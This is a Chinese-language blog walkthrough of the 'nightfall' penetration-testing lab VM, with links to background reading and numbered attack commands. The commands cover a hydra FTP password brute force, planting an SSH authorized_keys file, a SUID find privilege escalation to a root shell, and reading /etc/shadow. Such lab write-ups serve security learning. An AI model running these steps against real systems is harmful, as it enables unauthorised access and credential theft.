---
title: nightfall渗透测试
date: 2019-09-10 19:03:41
tags:
---

# 背景知识
[什么是SAMBA](https://www.ctolib.com/docs/sfile/vbird-linux-server-3e/114.html)

[enum4linux](https://hackfun.org/2016/10/23/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8Benum4linux/)

[uid之ruid，euid，suid](https://cysecguide.blogspot.com/2016/10/difference-among-ruid-euid-suid.html)
1. https://brucechen7.github.io/2014/11/14/2014-11-14-euid-ruid-euid/
1. https://unix.stackexchange.com/questions/191940/difference-between-owner-root-and-ruid-euid
2. https://www.jianshu.com/p/23f2f2be2b29
1. https://www.cnblogs.com/limingluzhu/p/5702486.html
1. https://www.anquanke.com/post/id/86979 (推荐)

[/etc/passwd和/etc/shadow的区别](http://www.chinastor.com/os/linux/092034W22016.html)

# 攻击步骤
1. 发现主机
```
netdiscover
```
2. 扫描端口
```
nmap -A xx.xxx.xx.x
```
3. 发掘用户信息
```
enum4linux xx.xx.xx.x
```
4. 暴力破解ftp密码
```
hydra -l matt -P /usr/share/wordlists/rockyou.txt ftp xx.xx.xx.xx -e nsr
```
5. 发现用户matt的密码为cheese, 登录ftp
6. 创建`~/.ssh`文件夹
```
ftp> mkdir .ssh
```
6. 本地创建ssh的key并将`id_rsa.pub`复制一份重命名为`authorized_keys`
```
ssh-keygen
cp ~/.ssh/id_rsa.pub ~/authorized_keys
```
8. nightfall上使用ftp上传本地的`~/.ssh/id_rsa.pub`到nightfall的新创建的`~/.ssh`文件夹下
```
ftp>cd .ssh
ftp>put authorized_keys
```
9. 直接登录matt账号
```
ssh matt@xx.xx.xxx.x
```
10. 查找具有SUID权限的文件
```
find / -perm -u=s -type f 2>/dev/null
```
11. 运行类find命令提权
```
cd /scripts
./find . -exec /bin/sh -p \; -quit
```
12. nightfall家目录下创建.ssh文件夹, 类似上传`authorized_keys`文件, 然后ssh登录nightfall账号
13. 读取shadow文件中的加密密码
```
sudo -u root cat /etc/shadow
```

```
nmap -sP -n -oX results.txt 10.188.1.1/16
grep -Eo 'addr=".*?" addrtype="ipv4"' results.txt | awk -F '"' '{print $2}' > ips.txt
nmap -sS -O -A -oX details.txt -iL ips.txt
```